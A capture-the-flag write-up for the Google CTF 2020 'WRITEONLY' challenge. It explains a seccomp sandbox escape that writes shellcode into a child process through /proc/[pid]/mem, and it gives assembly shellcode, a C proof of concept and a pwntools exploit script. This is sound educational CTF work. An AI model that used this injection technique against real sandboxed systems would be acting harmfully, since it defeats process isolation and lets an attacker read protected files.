# Writeup - Google CTF Qualifier - WRITEONLY

*WRITEONLY* was a challenge at the Google CTF Qualifier 2020.
It was tagged as a sandbox escape challenge and the description read as follows:

> This sandbox executes any shellcode you send. But thanks to seccomp, you won't be able to read /home/user/flag.


Let's start by examining the given files:
```
writeonly
├── chal
├── chal.c
└── Makefile
```

`chal` is the binary which is running as the remote service.
It is a 64-bit statically linked executable.
Furthermore it is no position independent executable (PIE) meaning we can easily determine addresses of functions, variables and the like statically.

We are also given its source `chal.c`, which is always a good starting point for analysis.
```c
int main(int argc, char *argv[]) {
  pid_t pid = check(fork(), "fork");
  if (!pid) {
    while (1) {
      check_flag();
    }
    return 0;
  }

  printf("[DEBUG] child pid: %d\n", pid);
  void_fn sc = read_shellcode();
  setup_seccomp();
  sc();

  return 0;
}

```
As stated by the problem description, the service will read our shellcode (`void_fn sc = read_shellcode()`) and execute it (`sc()`).
The shellcode though is sandboxed using secure computing mode (`setup_seccomp()`), which basically allows or denies specific system calls.
If the process attempts any other system calls it will usually be terminated by issuing a `SIGKILL`.

Apparently the service also spawns a child process, which seems to be a little bit strange.
We can see that the child process runs an infinite loop of `check_flag()`.
The parent process will display the PID of the created process (such a nice gesture) and continue with the execution of the shellcode.

### Investigating seccomp

Checking `setup_seccomp()` we can see that our shellcode is only allowed to do a specified list of system calls:
```c
void setup_seccomp() {
  scmp_filter_ctx ctx;
  ctx = seccomp_init(SCMP_ACT_KILL);
  int ret = 0;
  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(close), 0);
  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(stat), 0);
  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(fstat), 0);
  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(lstat), 0);
  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(lseek), 0);
  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(mprotect), 0);
  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(execve), 0);
  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
  // ...
  // some rules omitted
  // ...
  ret |= seccomp_load(ctx);
  if (ret) {
    exit(1);
  }
}

```

Any system call which is not listed will cause the process to be terminated (default rule `SCMP_ACT_KILL`).
We can quickly verify the behaviour using a little sample C program:
```c
// file: sample_seccomp.c
// compile with:
// gcc -c -o sample_seccomp.o sample_seccomp.c
// gcc sample_seccomp.o -lseccomp -o sample_seccomp
//
// you may want to install seccomp.h:
// sudo apt install libseccomp-dev

#include <unistd.h>
#include <seccomp.h>

int main(void) {
  char buf[12];
  scmp_filter_ctx ctx;

  ctx = seccomp_init(SCMP_ACT_KILL);
  seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
  seccomp_load(ctx);

  write(1, "This is fine!\n", 14);

  read(0, buf, sizeof(buf));

  write(1, "Not reached!!\n", 14);

  return 0;
}
```

Running this yields the following result:
```
$ ./sample_seccomp
This is fine!
Bad system call [Exit 159]
```

The seccomp configuration is inherited by all child processes, so a simple `fork()` or `execve(..)` will not be enough to bypass the restrictions.

### Checking potential Exploit Paths

So we will have to find a way to read `/home/user/flag` using only the system calls available to us.
Studying the list of allowed system calls we will reveal that we are allowed to do basically everything we could wish for except reading files.
Since we cannot bypass the restrictions imposed by seccomp we will have to find another way.

Let's delve further into the source code.
Recall that we stumbled across this strangly placed `fork` in the main method of the service.
The spawned child process will continue to call `check_flag()` until the process is terminated.

```c
void check_flag() {
  while (1) {
    char buf[4] = "";
    int fd = check(open("/home/user/flag", O_RDONLY), "open(flag)");
    if (read(fd, buf, sizeof(buf)) != sizeof(buf)) {
      err(1, "read(flag)");
    }
    close(fd);
    if (memcmp(buf, "CTF{", sizeof(buf)) != 0) {
      errx(1, "flag doesn't start with CTF{");
    }
    sleep(1);
  }
}

```

Inspecting this method reveals that the child process is periodically checking whether the file containing the flag is still valid.
Is this a hint that we can leak the content of the file `/home/user/flag` by simply writing to it?
By writing one byte at a time and waiting for the child process to validate the file we could indeed leak the contents of all the bytes checked!
Sadly the child process does only read the first 4 bytes which is not exactly helpful for recovering the entire content.
Also if we knew what the child process was expecting in `/home/user/flag` the whole challenge would be pointless anyways, wouldn't it?

So we need find another way.
The rest of the source code consists of utility functions only, which do not appear to be vulnerable.
Intuitively this means we already stumbled upon the solution, we just didn't recognize it.

### Delving into `/proc`

Let's step back a little.
Since we are given the PID of the child process a good place to dig seems to be the `/proc` pseudo-filesystem, which could potentially allow us to leak information.
This filesystem manages information about all the processes in `/proc/[pid]/`. 
Further information about this filesystem and all the files available can be found by reading the manual (`man proc`).

A special directory is `/proc/self/` which is basically a shortcut for `/proc/[pid of currently executing process]/`.
For example, you can inspect the commandline used to invoke the process:
```
$ cat /proc/self/cmdline
cat /proc/self/cmdline
```

Another very interesting pseudo-file is `/proc/[pid]/mem` which contains all the process' mapped memory.
This means, we can f. e. read the content of variables in the running process.
Furthermore we can even write into the process' memory!
Usually this functionality is used by debuggers like `gdb` in conjunction with `ptrace`.

A simple example which reads the currently executing code and dumps it to stdout may look like this:
```c
// file read_proc_self.c
// compile with
// gcc -o read_proc_self read_proc_self.c

#include <sys/types.h>
#include <fcntl.h>
#include <unistd.h>

int main(void) {
    int fd;
    char buff[256];
    int n_read;

    fd = open("/proc/self/mem", O_RDONLY);

    lseek(fd, (off_t)&main, SEEK_CUR);
    n_read = read(fd, buff, sizeof(buff));
    close(fd);

    write(1, buff, n_read);
    
    return 0;
}
```

The output will look like this:

```
$ ./read_proc_self | xxd
00000000: f30f 1efa 5548 89e5 4881 ec20 0100 0064  ....UH..H.. ...d
00000010: 488b 0425 2800 0000 4889 45f8 31c0 be00  H..%(...H.E.1...
00000020: 0000 0048 8d3d 040e 0000 b800 0000 00e8  ...H.=..........
00000030: d6fe ffff 8985 e8fe ffff 488d 0dbf ffff  ..........H.....
00000040: ff8b 85e8 feff ffba 0100 0000 4889 ce89  ............H...
00000050: c7e8 84fe ffff 488d 8df0 feff ff8b 85e8  ......H.........
00000060: feff ffba 0001 0000 4889 ce89 c7e8 88fe  ........H.......
00000070: ffff 8985 ecfe ffff 8b85 e8fe ffff 89c7  ................
00000080: e865 feff ff8b 85ec feff ff48 63d0 488d  .e.........Hc.H.
00000090: 85f0 feff ff48 89c6 bf01 0000 00e8 18fe  .....H..........
000000a0: ffff b800 0000 0048 8b4d f864 4833 0c25  .......H.M.dH3.%
000000b0: 2800 0000 7405 e80f feff ffc9 c366 2e0f  (...t........f..
000000c0: 1f84 0000 0000 000f 1f00 f30f 1efa 4157  ..............AW
000000d0: 4c8d 3d63 2b00 0041 5649 89d6 4155 4989  L.=c+..AVI..AUI.
000000e0: f541 5441 89fc 5548 8d2d 542b 0000 534c  .ATA..UH.-T+..SL
000000f0: 29fd 4883 ec08 e82f fdff ff48 c1fd 0374  ).H..../...H...t
```

You can quickly verify that this is indeed the currently executing code by disassembling the binary and comparing the `main` section:
```
$ objdump -d read_proc_self
```

### Re-evaluating our Choices

If *we* could control such a file for any process other than our own we could easily manipulate the execution and force the hijacked process into revealing the flag to us.
An easy target seems to be the created child process as the service has the courtesy of revealing its PID to us!

Usually access to this file is restricted by a ptrace access mode, essentially disallowing arbitrary processes from reading / writing arbitrary process memory.
But luckily our shellcode will execute as the parent process of the process we would like to manipulate memory from, which satisfies the access mode!


To summarize, our analysis yielded the following plan:
* We create a shellcode which injects code into the spawned child process.
* This code manipulates the child process to read the file `/home/user/flag` and simply display its contents to us. 

### Excourse: Assembly 101

At this point a quick recap of the most important aspects for writing assembler:
* If you are not familiar with the assembler syntax I suggest you read the [GNU Assembler Wiki](https://en.wikibooks.org/wiki/X86_Assembly/GAS_Syntax) and jump back and forth between this writeup and this very handy [cheatsheet](https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf)
* Calling conventions of system calls:
    * Number of system call in `%rax`
    * Arguments are passed in order `%rdi`, `%rsi`, `%rdx`, `%r10`
    * Results are stored in `%rax`
* Some important system calls used:
    * `0 - read(unsigned fd, char *buf, size_t count)` for reading files
    * `1 - write(unsigned fd, const char *buf, size_t count)` for writing files
    * `2 - open(const char *filename, int flags)` for opening files
    * `8 - lseek(unsigned fd, off_t offset, unsigned origin)` for navigating within files
    * `60 - exit(int code)` for graceful exits

### `cat /home/user/flag` - Assembly Version

We will start by creating a shellcode which dumps `/home/user/flag` to stdout:

```Assembly
# file cat-flag.s
# compile with:
# as -o cat-flag.o cat-flag.s

.section .text

.globl _start

_start:

    movq $0x0067616c662f7265, %rdi      
    pushq %rdi                          # store "er/flag\x00" on stack
                                        # note the reverse byte order
    movq $0x73752f656d6f682f, %rdi
    pushq %rdi                          # store /home/us on stack
    movq %rsp, %rdi                     # %rdi now contains a pointer to
                                        # "/home/user/flag\x00"

    movq $0x2, %rax                     # syscall 2 = open
    xor %rsi, %rsi                      # O_RDONLY = 0
    syscall                             # open("/home/user/flag", O_RDONLY)

    movq %rdi, %rsi                     
    movq %rax, %rdi                     # move fd from %rax into %rdi
    movq $0x100, %rdx                   # count = 256
    movq $0x0, %rax                     # syscall 0 = read
    syscall                             # read(fd = %rdi, %rsp, 256)

    movq %rax, %rdx                     # move number of bytes read to %rdx
    movq $0x1, %rdi                     # write to stdout = 1
    movq $0x1, %rax                     # syscall 1 = write
    syscall                             # write(1, %rsp, <bytes read>)

    xor %rdi, %rdi
    movq $0x3c, %rax
    syscall                             # exit(0)

```

We can validate our shellcode by compiling and linking it:
```
$ as -o cat-flag.o cat-flag.s
$ ld -o cat-flag cat-flag.o
```

After creating a fake flag file on your lab machine at `/home/user/flag` you may validate the functionality:
```
$ ./cat-flag
CTF{SuchFakeFlag}
```

### Putting the pieces together: Proof of Concept

We now have to inject this shellcode into the child process.
In order to make this sandbox escape easier to grasp I put together this simple proof of concept:
```c
// file poc.c
// compile with
// gcc -no-pie -o poc poc.c

#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <signal.h>
#include <unistd.h>
#include <stdio.h>

// this is the shellcode created above (cat-flag.s)
unsigned char code[90] = { '\x48', '\xbf', '\x65', '\x72', '\x2f', '\x66', '\x6c', '\x61', '\x67', '\x00', '\x57', '\x48', '\xbf', '\x2f', '\x68', '\x6f', '\x6d', '\x65', '\x2f', '\x75', '\x73', '\x57', '\x48', '\x89', '\xe7', '\x48', '\xc7', '\xc0', '\x02', '\x00', '\x00', '\x00', '\x48', '\x31', '\xf6', '\x0f', '\x05', '\x48', '\x89', '\xfe', '\x48', '\x89', '\xc7', '\x48', '\xc7', '\xc2', '\x00', '\x01', '\x00', '\x00', '\x48', '\xc7', '\xc0', '\x00', '\x00', '\x00', '\x00', '\x0f', '\x05', '\x48', '\x89', '\xc2', '\x48', '\xc7', '\xc7', '\x01', '\x00', '\x00', '\x00', '\x48', '\xc7', '\xc0', '\x01', '\x00', '\x00', '\x00', '\x0f', '\x05', '\x48', '\x31', '\xff', '\x48', '\xc7', '\xc0', '\x3c', '\x00', '\x00', '\x00', '\x0f', '\x05' };

void do_child_stuff() {
    while(1) {
        puts("Hi from child!");
        sleep(1);
    }
}

int main(void) {

    pid_t pid = fork();

    if (pid == 0) {
        do_child_stuff();
        return 0;
    } else {

        char path[50] = "";
        sprintf(path, "/proc/%d/mem", pid);

        printf("Child pid = %d\n", pid);

        int fd = open(path, O_WRONLY);

        // 0x401294 is the address of do_child_stuff, right behind sleep(1);
        lseek(fd, 0x401294, SEEK_CUR);
        write(fd, code, sizeof(code)); 
        close(fd);

        sleep(4);

        kill(pid, SIGKILL);
        return 0;
    }


    return 0;
}

```

The child process will indefinitely print `Hi from child!` to stdout.
The parent process will open the child process' memory and overwrite the instruction right after `sleep(1);`.
Note that since we compiled with `-no-pie` we can simply hard-code the address to overwrite:

```objdump
0000000000401276 <do_child_stuff>:
  401276:       f3 0f 1e fa             endbr64 
  40127a:       55                      push   %rbp
  40127b:       48 89 e5                mov    %rsp,%rbp
  40127e:       48 8d 3d 7f 0d 00 00    lea    0xd7f(%rip),%rdi
  401285:       e8 56 fe ff ff          callq  4010e0 <puts@plt>
  40128a:       bf 01 00 00 00          mov    $0x1,%edi
  40128f:       e8 dc fe ff ff          callq  401170 <sleep@plt>
  401294:       eb e8                   jmp    40127e <do_child_stuff+0x8>
```

After writing the shellcode into the child process at `0x401294` it will continue to execute the injected code and print the flag:
```
$ ./poc
Child pid = 292
Hi from child!
CTF{SuchFakeFlag}
```
### Assembling the final Exploit

The only piece left to do is adapting the C code above to the vulnerable service:
Similiarly we can extract the correct address to overwrite in `chal`.
We will choose to overwrite the jump at `0x4022e3` as in the example above:
```objdump

0000000000402232 <check_flag>:
  402232:       55                      push   %rbp
  402233:       48 89 e5                mov    %rsp,%rbp
  ...
  4022d9:       bf 01 00 00 00          mov    $0x1,%edi
  4022de:       e8 fd cf 04 00          callq  44f2e0 <__sleep>
  4022e3:       e9 52 ff ff ff          jmpq   40223a <check_flag+0x8>
```

This finally leads to this shellcode:

```Assembly
# compile with
# as inject.s -o inject.o

.section .text

.globl _start

_start:
    
    # preserve instruction pointer, we will need it later
    pushq %rax

    # write shellcode cat-flag.o on stack
    
    movq $0x000000000000050f, %rdi
    pushq %rdi
    movq $0x0000003cc0c748ff, %rdi
    pushq %rdi
    movq $0x3148050f00000001, %rdi
    pushq %rdi
    movq $0xc0c74800000001c7, %rdi
    pushq %rdi
    movq $0xc748c28948050f00, %rdi
    pushq %rdi
    movq $0x000000c0c7480000, %rdi
    pushq %rdi
    movq $0x0100c2c748c78948, %rdi
    pushq %rdi
    movq $0xfe8948050ff63148, %rdi
    pushq %rdi
    movq $0x00000002c0c748e7, %rdi
    pushq %rdi
    movq $0x89485773752f656d, %rdi
    pushq %rdi
    movq $0x6f682fbf48570067, %rdi
    pushq %rdi
    movq $0x616c662f7265bf48, %rdi
    pushq %rdi

    movq %rsp, %rbx                         # shellcode 'cat-flag' at ($rbx), len=90 (0x5a)

    movq $0x01000000006d656d, %rdi          # the 0x01 at the beginning is used to force 
                                            # an 8 byte instruction. It makes replacing 
                                            # the PID much easier
    pushq %rdi
    movq $0x2f322f636f72702f, %rdi
    pushq %rdi
    movq %rsp, %rdi                         # "/proc/2/mem" at ($rdi)

    movq $0x1, %rsi
    movq $0x2, %rax
    syscall                                 # open("/proc/2/mem", O_WRONLY)

    movq %rax, %rdi
    movq $0x4022e3, %rsi                    # 0x4022e3 is the addr where we place the code
    movq $0x1, %rdx
    movq $0x8, %rax
    syscall                                 # lseek(fd = %rdi, 0x4022e3, SEEK_CUR)

    movq %rbx, %rsi
    movq $0x5a, %rdx
    movq $0x1, %rax
    syscall                                 # write(fd = %rdi, shellcode = (%rsi), 90)

    addq $0x70, %rsp                        # undo all our push operations
    popq %rdi
    addq $0xe7, %rdi                        # recover instruction pointer to setup loop

    movq $0x18, %rax                        # syscall 24 = sched_yield
    syscall
    jmp *%rdi                               # infinite loop: sched_yield()
                                            # we loop here until the child process wakes
                                            # from sleep(1)

    xor %rdi, %rdi
    movq $0x3c, %rax
    syscall                                 # exit(0) nicely, because why not?
```

I simply chose to push the to-be-injected shellcode onto the stack. 
The rest of the code is pretty straight forward and is similiar to `cat-flag.s`.
The loop at the end is needed to wait until the `sleep(1)` in `check_flag()` returns.
It would be very sad if we kill the service before the process was able to execute our injected shellcode, wouldn't it?

### Escaping the Sandbox

Finally we only need a driver script which sends the appropriate shellcode to the service:
```python
# file exploit.py

from pwn import *
import re
import sys


# this is inject.s
shellcode = b'PH\xc7\xc7\x0f\x05\x00\x00WH\xbf\xffH\xc7\xc0<\x00\x00\x00WH\xbf\x01\x00\x00\x00\x0f\x05H1WH\xbf\xc7\x01\x00\x00\x00H\xc7\xc0WH\xbf\x00\x0f\x05H\x89\xc2H\xc7WH\xbf\x00\x00H\xc7\xc0\x00\x00\x00WH\xbfH\x89\xc7H\xc7\xc2\x00\x01WH\xbfH1\xf6\x0f\x05H\x89\xfeWH\xbf\xe7H\xc7\xc0\x02\x00\x00\x00WH\xbfme/usWH\x89WH\xbfg\x00WH\xbf/hoWH\xbfH\xbfer/flaWH\x89\xe3H\xbfmem\x00\x00\x00\x00\x01WH\xbf/proc/2/WH\x89\xe7H\xc7\xc6\x01\x00\x00\x00H\xc7\xc0\x02\x00\x00\x00\x0f\x05H\x89\xc7H\xc7\xc6\xe3"@\x00H\xc7\xc2\x01\x00\x00\x00H\xc7\xc0\x08\x00\x00\x00\x0f\x05H\x89\xdeH\xc7\xc2Z\x00\x00\x00H\xc7\xc0\x01\x00\x00\x00\x0f\x05H\x83\xc4p_H\x81\xc7\xe7\x00\x00\x00H\xc7\xc0\x18\x00\x00\x00\x0f\x05\xff\xe7H1\xffH\xc7\xc0<\x00\x00\x00\x0f\x05'

p = process(["./chal"])
# p = remote("writeonly.2020.ctfcompetition.com", 1337)

init = p.recvuntil(b"length? ")

# extract the pid of the child process
m = re.search(br"child pid: (\d+)", init)
assert m
pid = int(m.group(1))

log.info(f"Child pid = {pid}")

# replace pid in shellcode
# this is rather lengthy, but we have to make sure the alignment is kept intact
pid = str(pid).encode("utf-8")
if len(pid) == 1:
    shellcode = shellcode.replace(b"/proc/2/", b"/proc/%s/" % pid)
else:
    shellcode = shellcode.replace(b"/proc/2/", b"/proc/%s" % pid[:2])
    shellcode = shellcode.replace(b"mem\x00\x00\x00\x00\x01", (b"%s/mem" % pid[2:]).ljust(8, b"\x00"))

p.sendline(b"%d" % len(shellcode))
p.recvuntil(b"shellcode. ")
p.send(shellcode)

p.interactive()
```

The moment of truth:
```
$ python3 exploit.py
[+] Opening connection to writeonly.2020.ctfcompetition.com on port 1337: Done
[*] Child pid = 2
[*] Switching to interactive mode
CTF{why_read_when_you_can_write}

```

Overall it was a fun challenge and a good practice for my (lacking) assembler skills.
I hope you liked it, too.
Happy hacking!

